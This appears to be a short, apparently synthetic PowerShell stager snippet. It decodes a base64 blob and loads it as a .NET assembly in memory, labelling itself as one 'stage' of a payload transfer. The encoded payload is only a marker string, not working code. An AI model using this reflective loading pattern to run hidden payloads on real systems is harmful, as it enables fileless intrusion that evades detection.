
try { $PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpoNTBudHFudXBs"); $FetchResult = [Reflection.Assembly]::Load($PayloadBytes); $FetchResult.GetTypes().Count; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Write-Output "stage 5 initialized" } catch { Write-Warning "Stage transfer failed" }
